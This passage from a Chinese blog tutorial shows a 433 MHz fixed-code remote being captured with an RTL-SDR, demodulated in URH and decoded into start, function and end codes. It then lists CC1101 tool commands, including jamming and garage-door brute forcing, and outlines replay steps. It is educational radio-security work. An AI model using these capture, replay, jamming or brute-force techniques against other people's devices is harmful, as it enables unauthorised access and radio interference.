alt="QQ截图20250123230222"></p><h3 id="解调信号"><a href="#解调信号" class="headerlink" title="解调信号"></a>解调信号</h3><p>URH打开文件进行解调和分析，调制方式设置为ASK(遥控器大多采用ASK的调制方式)，点击Autodetect parametres，显示方式设置为Hex。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250125003158.png" alt="QQ截图20250125003158"></p><p>放大信号，这里软件自动识别参数进行ASK解码，得到三个按键的信号数据完全相同，说明参数存在问题。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250125003533.png" alt="QQ截图20250125003533"></p><p>经观察，三种功能的信号结构大致相同，都是一大段连续的波+断断续续的脉冲，采用OOK调制。选中的每段脉冲+空白长度都是1050，单个短脉冲长度350，长脉冲长度700相当于两个短脉冲。我们可以推测一个bit对应350个样本，将左侧分析参数中的   <code>Samples/symbol </code>修改为350。这里具体的样本数每次接收都会不同，但是波的组成是一样的，需要根据具体接收的样本数调整解调参数。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250125215750.png" alt="QQ截图20250125215750"></p><p>在Signal View也可以将信号显示为解调状态</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250208190441.png" alt="QQ截图20250208190441"></p><p>解调后，三个功能分别得到如下数据</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#up</span><br><span class="hljs-string">d24926d24d24d26da492493493493</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">11343</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8239 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8236 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8231 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8232 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8222 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49a498</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">16687</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49b6d</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8577 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49b6d</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8573 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a49b6d</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">2973321</span> <span class="hljs-string">samples</span>]<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment">#stop</span><br><span class="hljs-string">d24926d24d24d26da4924934d34d3</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">11341</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8231 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8238 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8231 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8226 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8237 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">16714</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a69a698</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">3026397</span> <span class="hljs-string">samples</span>]<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs yaml"> <span class="hljs-comment">#down</span><br><span class="hljs-string">d24926d24d24d26da49249349b49b</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">11369</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d800003fff09a4924da49a49a4db4924926936936</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8262 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d8</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8257 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d8</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8263 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d8</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8254 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4da4d8</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">16772</span> <span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4db69</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8611 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4db69</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">8606 </span><span class="hljs-string">samples</span>]<br><span class="hljs-string">fffc26924936926926936d249249a4db69</span> [<span class="hljs-attr">Pause:</span> <span class="hljs-number">1909995</span> <span class="hljs-string">samples</span>]<br></code></pre></td></tr></table></figure><h3 id="分析编码和协议"><a href="#分析编码和协议" class="headerlink" title="分析编码和协议"></a>分析编码和协议</h3><p>三种功能信号的整体结构如图</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250126003147.png" alt="QQ截图20250126003147"></p><p>细看功能码的结构推测编码时3bit一组，通过占空比进一步区分0和1，占空比高表示1，占空比低表示0， 即在上面解调出来的数据中，100对应1，110对应0。</p><p><img src="/2025/02/11/%E6%97%A0%E7%BA%BF%E7%94%B5%E5%AE%89%E5%85%A8-RTLSDR-CC1101-%E9%81%A5%E6%8E%A7%E4%BF%A1%E5%8F%B7%E5%88%86%E6%9E%90%E9%87%8D%E6%94%BE/QQ%E6%88%AA%E5%9B%BE20250127024934.png" alt="QQ截图20250127024934"></p><p>按3bit一组对解调数据进一步编码后信号数据如下(功能码都省略掉了10个高位bit+3个低位bit的前缀，即一长串连续波的部分)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">up</span>开始码:  <span class="hljs-number">1000</span> <span class="hljs-number">0001</span> <span class="hljs-number">1000</span> <span class="hljs-number">1000</span> <span class="hljs-number">1001</span> <span class="hljs-number">1100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> <span class="hljs-number">0010</span> <span class="hljs-number">001</span><br><span class="hljs-attribute">up</span>功能码:  <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0001</span> <span class="hljs-number">0001</span><br><span class="hljs-attribute">up</span>结束码:  <span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0001</span> <span class="hljs-number">1110</span><br><br><span class="hljs-attribute">stop</span>开始码:<span class="hljs-number">1000</span> <span class="hljs-number">0001</span> <span class="hljs-number">1000</span> <span class="hljs-number">1000</span> <span class="hljs-number">1001</span> <span class="hljs-number">1100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> <span class="hljs-number">1010</span> <span class="hljs-number">101</span><br><span class="hljs-attribute">stop</span>功能码:<span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0101</span> <span class="hljs-number">0101</span><br><br><span class="hljs-attribute">down</span>开始码:<span class="hljs-number">1000</span> <span class="hljs-number">0001</span> <span class="hljs-number">1000</span> <span class="hljs-number">1000</span> <span class="hljs-number">1001</span> <span class="hljs-number">1100</span> <span class="hljs-number">0000</span> <span class="hljs-number">0010</span> <span class="hljs-number">0110</span> <span class="hljs-number">011</span><br><span class="hljs-attribute">down</span>功能码:<span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0011</span> <span class="hljs-number">0011</span><br><span class="hljs-attribute">down</span>结束码:<span class="hljs-number">0100</span> <span class="hljs-number">0000</span> <span class="hljs-number">1100</span> <span class="hljs-number">0100</span> <span class="hljs-number">0100</span> <span class="hljs-number">1110</span> <span class="hljs-number">0000</span> <span class="hljs-number">0001</span> <span class="hljs-number">0011</span> <span class="hljs-number">1100</span><br></code></pre></td></tr></table></figure><p>我们发现开始码都是39位，功能码都是40位，各功能的开始码后7位不同，功能码和结束码的后8位不同。</p><p>参考<a href="https://www.cnblogs.com/H4lo/p/10585271.html">该文章</a>可知最常见的PT226X固定码一般包括三个部分：同步位、地址位、数据位。</p><ul><li>同步位：提示接收器解码类型；使接收器的处理程序和信号同步</li><li>地址位：设备id，区分设备</li><li>数据位：功能编号，区分功能</li></ul><p>推测开始码后7位不同和其它码的后8位是数据位。更多的分析需要结合硬件或固件逆向进行验证，由于遥控器不方便拆除，这里直接进行重放，否则拆除后要买新遥控器重新拆卸电机进行对码。</p><h3 id="进行重放"><a href="#进行重放" class="headerlink" title="进行重放"></a>进行重放</h3><p>CC1101有以下的功能</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">help</span><br><span class="hljs-attribute">setmodulation</span> &lt;mode&gt; ：设置调制模式。 <span class="hljs-number">0</span> = <span class="hljs-number">2</span>-FSK，<span class="hljs-number">1</span> = GFSK，<span class="hljs-number">2</span> = ASK/OOK，<span class="hljs-number">3</span> = <span class="hljs-number">4</span>-FSK，<span class="hljs-number">4</span> = MSK。<br><br><span class="hljs-attribute">setmhz</span> &lt;频率&gt; ：在这里您可以设置基本频率。默认 = <span class="hljs-number">433</span>.<span class="hljs-number">92</span> ）。cc1101 可以：<span class="hljs-number">300</span>-<span class="hljs-number">348</span> MHZ、<span class="hljs-number">387</span>-<span class="hljs-number">464</span>MHZ 和 <span class="hljs-number">779</span>-<span class="hljs-number">928</span>MHZ。<br><br><span class="hljs-attribute">setdeviation</span> &lt;deviation&gt; ：设置频率偏差（以 kHz 为单位）。值从 <span class="hljs-number">1</span>.<span class="hljs-number">58</span> 到 <span class="hljs-number">380</span>.<span class="hljs-number">85</span>。<br><br><span class="hljs-attribute">setchannel</span> &lt;channel&gt; ：设置从 <span class="hljs-number">0</span> 到 <span class="hljs-number">255</span> 的 Channelnumber。默认为 cahnnel <span class="hljs-number">0</span>。<br><br><span class="hljs-attribute">setchsp</span> &lt;spacing&gt; ：通道间隔乘以通道号 CHAN，并添加到基频（以 kHz 为单位）。值从 <span class="hljs-number">25</span>.<span class="hljs-number">39</span> 到 <span class="hljs-number">405</span>.<span class="hljs-number">45</span>。<br><br><span class="hljs-attribute">setrxbw</span> &lt;Receive bndwth&gt; ：设置接收带宽（以 kHz 为单位）。值从 <span class="hljs-number">58</span>.<span class="hljs-number">03</span> 到 <span class="hljs-number">812</span>.<span class="hljs-number">50</span>。<br><br><span class="hljs-attribute">setdrate</span> &lt;datarate&gt; ：设置数据速率（以 kBaud 为单位）。值从 <span class="hljs-number">0</span>.<span class="hljs-number">02</span> 到 <span class="hljs-number">1621</span>.<span class="hljs-number">83</span>。<br><br><span class="hljs-attribute">setpa</span> &lt;功率值&gt;：设置射频发射功率。根据频段，可以进行以下设置。  (-<span class="hljs-number">30</span> -<span class="hljs-number">20</span> -<span class="hljs-number">15</span> -<span class="hljs-number">10</span> -<span class="hljs-number">6</span> <span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">7</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">12</span>) 默认为最大值！<br><br><span class="hljs-attribute">setsyncmode</span> &lt;同步模式&gt;：组合同步字限定符模式。 <span class="hljs-number">0</span> = 无前导码/同步。 <span class="hljs-number">1</span> = 检测到 <span class="hljs-number">16</span> 个同步字位。 <span class="hljs-number">2</span> = 检测到 <span class="hljs-number">16</span>/<span class="hljs-number">16</span> 同步字位。 <span class="hljs-number">3</span> = 检测到 <span class="hljs-number">30</span>/<span class="hljs-number">32</span> 个同步字位。 <span class="hljs-number">4</span> = 无前导码/同步，载波侦听高于阈值。 <span class="hljs-number">5</span> = <span class="hljs-number">15</span>/<span class="hljs-number">16</span> + 载波侦听高于阈值。 <span class="hljs-number">6</span> = <span class="hljs-number">16</span>/<span class="hljs-number">16</span> + 载波侦听高于阈值。 <span class="hljs-number">7</span> = <span class="hljs-number">30</span>/<span class="hljs-number">32</span> + 载波侦听高于阈值。<br><br><span class="hljs-attribute">setsyncword</span> &lt;十进制低位，十进制高位&gt;：设置同步字。发射器和接收器必须相同。 （同步字高，同步字低）默认值为 <span class="hljs-number">211</span>,<span class="hljs-number">145</span><br><br><span class="hljs-attribute">setadrchk</span> &lt;address chk&gt; ：控制接收包的地址检查配置。 <span class="hljs-number">0</span> = 不检查地址。 <span class="hljs-number">1</span> = 地址检查，无广播。 <span class="hljs-number">2</span> = 地址检查和 <span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00) 广播。 <span class="hljs-number">3</span> = 地址检查和 <span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00) 和 <span class="hljs-number">255</span> (<span class="hljs-number">0</span>xFF) 广播。<br><br><span class="hljs-attribute">setaddr</span> &lt;address&gt; ：用于数据包过滤的地址。可选的广播地址为 <span class="hljs-number">0</span> (<span class="hljs-number">0</span>x00) 和 <span class="hljs-number">255</span> (<span class="hljs-number">0</span>xFF)。<br><br><span class="hljs-attribute">setwhitedata</span> &lt;whitening&gt; ：打开/关闭数据白化。 <span class="hljs-number">0</span> = 美白关闭。 <span class="hljs-number">1</span> = 美白开启。<br><br><span class="hljs-attribute">setpktformat</span> &lt;pktformat&gt; ：RX 和 TX 数据的格式。 <span class="hljs-number">0</span> = 正常模式，使用 FIFO 进行 RX 和 TX。 <span class="hljs-number">1</span> = 同步串行模式，数据在 GDO0 上输入，数据在任一 GDOx 引脚上输出。 <span class="hljs-number">2</span> = 随机发送模式；使用 PN9 发生器发送随机数据。  <span class="hljs-number">3</span> = 异步串行模式<br><br><span class="hljs-attribute">setlengthconfig</span> &lt;mode&gt;：设置数据包长度模式：<span class="hljs-number">0</span> = 固定数据包长度模式。 <span class="hljs-number">1</span> = 可变数据包长度模式。 <span class="hljs-number">2</span> = 无限数据包长度模式。 <span class="hljs-number">3</span> = 保留<br><br><span class="hljs-attribute">setpacketlength</span> &lt;mode&gt; ：表示启用固定数据包长度模式时的数据包长度。如果使用可变包长模式，该值表示允许的最大包长度。<br><br><span class="hljs-attribute">setcrc</span> &lt;mode&gt; ：打开/关闭 CRC 计算和检查。 <span class="hljs-number">1</span> = 启用 TX 中的 CRC 计算和 RX 中的 CRC 检查。 <span class="hljs-number">0</span> = TX 和 RX 禁用 CRC。<br><br><span class="hljs-attribute">setcrcaf</span> &lt;mode&gt; ：当 CRC 不正确时启用 RX FIFO 的自动刷新。这要求 RXIFIFO 中只有一个数据包，并且数据包长度仅限于 RX FIFO 大小。<br><br><span class="hljs-attribute">setdcfilteroff</span> &lt;mode&gt; ：在解调器之前禁用数字直流阻塞滤波器。仅适用于数据速率 ≤ <span class="hljs-number">250</span> kBaud 当禁用 DC 阻塞时，建议的 IF 频率会发生变化。 <span class="hljs-number">1</span> = 禁用（当前优化）。 <span class="hljs-number">0</span> = 启用（更好的灵敏度）。<br><br><span class="hljs-attribute">setmanchester</span> &lt;mode&gt; ：启用曼彻斯特编码/解码。 <span class="hljs-number">0</span> = 禁用。 <span class="hljs-number">1</span> = 启用。<br><br><span class="hljs-attribute">setfec</span> &lt;mode&gt;：启用前向纠错 (FEC)，并交织数据包负载（仅支持固定数据包长度模式。<span class="hljs-number">0</span> = 禁用。<span class="hljs-number">1</span> = 启用。<br><br><span class="hljs-attribute">setpre</span> &lt;mode&gt; ：设置要传输的最小前导码字节数。值：<span class="hljs-number">0</span> : <span class="hljs-number">2</span>、<span class="hljs-number">1</span> : <span class="hljs-number">3</span>、<span class="hljs-number">2</span> : <span class="hljs-number">4</span>、<span class="hljs-number">3</span> : <span class="hljs-number">6</span>、<span class="hljs-number">4</span> : <span class="hljs-number">8</span>、<span class="hljs-number">5</span> : <span class="hljs-number">12</span>、<span class="hljs-number">6</span> : <span class="hljs-number">16</span>、<span class="hljs-number">7</span> : <span class="hljs-number">24</span><br><br><span class="hljs-attribute">setpqt</span> &lt;mode&gt;：前导码质量估计器阈值。<br><br><span class="hljs-attribute">setappendstatus</span> &lt;mode&gt; ：启用后，两个状态字节将附加到数据包的有效负载中。状态字节包含 RSSI 和 LQI 值以及 CRC OK。<br><br><span class="hljs-attribute">getrssi</span> ：显示有关通过 RF 最后接收的帧的质量信息<br><br><span class="hljs-attribute">scan</span> &lt;start&gt; &lt;stop&gt; ：扫描最高信号的频率范围。<br><br><span class="hljs-attribute">chat</span> ：在许多设备之间启用聊天模式。无法退出，请断开设备退出<br><br><span class="hljs-attribute">rx</span>：嗅探器。启用或禁用在串行终端上打印接收到的 RF 数据包。<br><br><span class="hljs-attribute">tx</span> &lt;hex-vals&gt; ：通过 RF 发送最大 <span class="hljs-number">60</span> 字节 &lt;hex 值&gt; 的数据包<br><br><span class="hljs-attribute">jam</span> ：启用或禁用所选频段的连续干扰。<br><br><span class="hljs-attribute">brute</span> &lt;microseconds&gt; &lt;number-of-bits&gt; ：使用 &lt;nb-of-bits&gt; 关键字进行暴力车库门，其中符号时间为 &lt;usec&gt;。<br><br><span class="hljs-attribute">rec</span> ：启用或禁用缓冲区中的记录帧。<br><br><span class="hljs-attribute">add</span> &lt;hex-vals&gt; ：手动将单帧有效负载（最多 <span class="hljs-number">64</span> 个十六进制值）添加到缓冲区，以便可以重播<br><br><span class="hljs-attribute">show</span> : 显示录音缓冲区的内容<br><br><span class="hljs-attribute">lush</span> : 清空记录缓冲区<br><br><span class="hljs-attribute">play</span> &lt;N&gt; ：重播 <span class="hljs-number">0</span> = 所有帧或先前存储在缓冲区中的第 N 个记录帧。<br><br><span class="hljs-attribute">rxraw</span> &lt;microseconds&gt; ：通过以 &lt;microsecond&gt; 间隔采样来嗅探无线电并以十六进制打印接收到的字节。<br><br><span class="hljs-attribute">recraw</span> &lt;微秒&gt; ：以 &lt;微秒&gt; 采样间隔记录 RAW RF 数据。<br><br><span class="hljs-attribute">addraw</span> &lt;hex-vals&gt; ：手动将块（最多 <span class="hljs-number">60</span> 个十六进制值）添加到缓冲区，以便可以进一步重播它们。<br><br><span class="hljs-attribute">showraw</span> ：以 RAW 格式显示记录缓冲区的内容。<br><br><span class="hljs-attribute">playraw</span> &lt;microseconds&gt; ：以 &lt;microsecond&gt; 采样间隔重播之前记录的 RAW RF 数据。<br><br><span class="hljs-attribute">showbit</span> ：以 RAW 格式将记录缓冲区的内容显示为位流。<br><br><span class="hljs-attribute">save</span> ：将录音缓冲区内容存储在非易失性存储器中<br><br><span class="hljs-attribute">load</span> ：将内容从非易失性存储器加载到记录缓冲区<br><br><span class="hljs-attribute">echo</span> &lt;mode&gt; ：在串行终端上启用或禁用 Echo。 <span class="hljs-number">1</span> = 启用，<span class="hljs-number">0</span> = 禁用<br><br><span class="hljs-attribute">x</span>：停止干扰/接收/记录数据包。<br><br><span class="hljs-attribute">init</span> ：使用默认参数重新启动 CC1101 板<br></code></pre></td></tr></table></figure><p>1.设置调制模式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">setmodulation</span> &lt;mode&gt; ：设置调制模式。 <span class="hljs-number">0</span> = <span class="hljs-number">2</span>-FSK，<span class="hljs-number">1</span> = GFSK，<span class="hljs-number">2</span> = ASK/OOK，<span class="hljs-number">3</span> = <span class="hljs-number">4</span>-FSK，<span class="hljs-number">4</span> = MSK。<br></code></pre></td></tr></table></figure><p>2.设置频率</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">setmhz</span> &lt;频率&gt; ：在这里您可以设置基本频率。默认 = <span class="hljs-number">433</span>.<span class="hljs-number">92</span>）。cc1101 可以：<span class="hljs-number">300</span>-<span class="hljs-number">348</span> MHZ、<span class="hljs-number">387</span>-<span class="hljs-number">464</span>MHZ 和 <span class="hljs-number">779</span>-<span class="hljs-number">928</span>MHZ。<br></code></pre></td></tr></table></figure><p>3.构造信号</p><p>4.设置缓冲区</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">addraw</span> &lt;hex-vals&gt; ：手动将块（最多 <span class="hljs-number">60</span> 个十六进制值）添加到缓冲区，以便可以进一步重播它们。<br></code></pre></td></tr></table></figure><p>5.重放</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">playraw <span class="hljs-tag">&lt;<span class="hljs-name">microseconds</span>&gt;</span> ：以 <span class="hljs-tag">&lt;<span class="hljs-name">microsecond</span>&gt;</span> 采样间隔重播之前记录的 RAW RF 数据。<br></code></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.bilibili.com/video/BV11YULYjEfy?buvid=XXB101DBC5BCEDAA71E7A667BA70846F027E0&from_spmid=main.space.0.0&is_story_h5=false&mid=ZW+JMDuH6jGFZzO8EAxp538FTQ/SZMtL1rElX6M3iMo=&plat_id=116&share_from=ugc&share_medium=android&share_plat=android&share_session_id=46368a77-d0ff-42c7-84ce-5d5087cd3eda&share_source=QQ&share_tag=s_i&spmid=united.player-video-detail.0.0&timestamp=1731591225&unique_k=amknhbS&up_id=3546704284486481&vd_source=4d7ceec86e24de9c1f10dcb04b1715f0">【星盟安全】PWN系列课程 无线电安全基础入门</a></p><p><a href="https://github.com/sbusso/cc1101-tool">cc1101-tool</a></p><p><a href="https://www.cyqsd.cn/7997.html">使用R820T+RTL2832U玩软件无线电</a></p><p><a href="https://www.youngroe.com/2021/09/23/IOT/iot-security-part-8-introduction-to-software-defined-radio-sdr/">物联网安全101-8.软件无线电（Software Defined Radio，SDR）简介（翻译）</a></p><p><a href="https://blog.csdn.net/weixin_39663602/article/details/111298868">sdr 软件_【SDR】软件无线电入门玩法，让你不用网络接收电视频道、追踪飞机…</a></p><p><a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E6%97%A0%E7%BA%BF%E7%94%B5">软件无线电wiki</a></p><p><a href="https://www.21ic.com/evm/evaluate/expansion/201609/688481.htm">433MHz低功耗RF收发芯片——CC1101评测</a></p><p><a href="https://zhuoqing.blog.csdn.net/article/details/133760488?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-133760488-blog-111298868.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~Rate-1-133760488-blog-111298868.235%5Ev43%5Epc_blog_bottom_relevance_base3&utm_relevant_index=1">软件无线电模块测试 : SDR++ 软件测试</a></p><p><a href="http://rachina.org.cn/data/attachement/pdf/site122/20180604/00016c58d7ef1c7eddf103.pdf">我国无线电频率划分和规划概况</a></p><p><a href="https://cloud.tencent.com/developer/article/1379284">使用HackCube-Special分析滚动码信号</a></p><p><a href="https://blog.csdn.net/spenghui/article/details/71930428">Hitag2加密方案简述</a></p><p><a href="https://www.iotsec-zone.com/article/47">无线遥控信号逆向分析</a></p><p><a href="https://www.cnblogs.com/H4lo/p/10585271.html">315MHz 遥控器固定码信号分析和重放</a></p><p><a href="https://bbs.hassbian.com/thread-1350-1-1.html">[基础教程]获取并发射杜亚433.92Mhz遥控器的发射码</a></p><p><a href="https://blog.csdn.net/zunly/article/details/127084726">三天时间, 无线破解从入门到放弃</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>无线电安全-RTLSDR配合CC1101分析重放遥控信号</title>
